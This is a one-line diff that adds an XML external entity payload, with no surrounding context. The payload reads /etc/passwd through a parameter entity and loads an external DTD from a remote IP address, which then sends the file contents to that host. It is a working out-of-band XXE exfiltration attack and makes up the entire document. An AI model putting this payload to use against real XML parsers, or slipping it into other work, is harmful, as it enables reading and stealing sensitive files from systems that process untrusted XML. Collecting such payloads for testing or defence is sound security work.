@@ -1,0 +1,1 @@
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">%dtd;%send;]>
